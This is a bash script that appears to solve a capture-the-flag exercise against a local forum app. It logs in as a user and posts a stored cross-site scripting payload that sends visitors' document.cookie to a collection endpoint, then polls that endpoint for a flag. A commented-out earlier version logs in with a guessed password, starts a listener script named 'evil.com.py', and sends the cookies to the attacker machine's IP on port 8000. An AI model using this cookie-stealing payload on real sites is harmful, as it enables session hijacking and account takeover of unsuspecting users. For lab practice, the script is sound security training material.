#!/usr/bin/env bash

make_blue() {
  echo -e "\033[1;94m$1\033[1;0m"
}

make_green() {
  echo -e "\033[1;92m$1\033[1;0m"
}

. ../login_as_johndoe.sh

domain="http://localhost:4942"
url_forum="$domain/forum/new"
url_api="$domain/api/collect"

funny_script="<script>fetch(\"/api/collect?c=\" + document.cookie)</script>"
location=$(curl -X POST "$url_forum" \
    -s \
    -w "%{redirect_url}" \
    -d "title=\"need help!\"&content=$funny_script" \
    -b cookie.txt);

echo "Listening to the server..."
seconds=0
timeout_seconds=120
deadline=$((seconds + timeout_seconds))
flag=""

while (( seconds < deadline )); do
    response=$(curl -s $url_api | head)
    flag=$(grep -oE 'FLAG\{[^}]+\}' <<< "$response" | head -n1)
    if [[ -n "$flag" ]]; then
        echo "$(make_green SUCCESS!!!) Flag is: $flag"
        exit
    fi
    sleep 5
    seconds=$((seconds + 5))
done

echo "Failure."

# domain="http://localhost:4942"
# hacked_joe="jdoe@student.42.tech"
# password="123456"
# url="$domain/forum/new"

# location=$(curl -X POST "$domain"/login \
#     -s \
#     -w "%{redirect_url}" \
#     -H "Content-Type: application/x-www-form-urlencoded" \
#     -d "identity=$hacked_joe&password=$password" \
#     -c cookie.txt);

# if [[ "$location" == "$domain/" ]]; then 
#     echo "$(make_green SUCCESS!) Logged in as joe.."
# else
#     echo "Were not able to login as joe...😔"
#     exit 1
# fi

# log_file="evil_log.txt"
# fuser -k 8000/tcp 2> /dev/null
# python -u evil.com.py > "$log_file" 2>&1 &
# server_pid="$!"
# ip=$(hostname -I | awk '{print $2}')
# funny_script="<script>fetch(\"http://$ip:8000/?c=\" + document.cookie)</script>"

# location=$(curl -X POST "$url" \
#     -s \
#     -w "%{redirect_url}" \
#     -d "title=\"need help!\"&content=$funny_script" \
#     -b cookie.txt);

# echo "Listening to the server..."
# seconds=0
# timeout_seconds=120
# deadline=$((seconds + timeout_seconds))
# flag=""

# while (( seconds < deadline )); do
#     if grep -qE 'FLAG\{[^}]+\}' "$log_file" 2>/dev/null; then
#         flag=$(grep -oE 'FLAG\{[^}]+\}' "$log_file" | head -n1)
#         break
#     fi
#     sleep 1
#     seconds=$((seconds + 1))
# done

# kill $server_pid 

# if [[ -n "$flag" ]]; then
#     echo "$(make_green SUCCESS!!!) Flag is: $flag"
# else
#     echo "Failure."
# fi
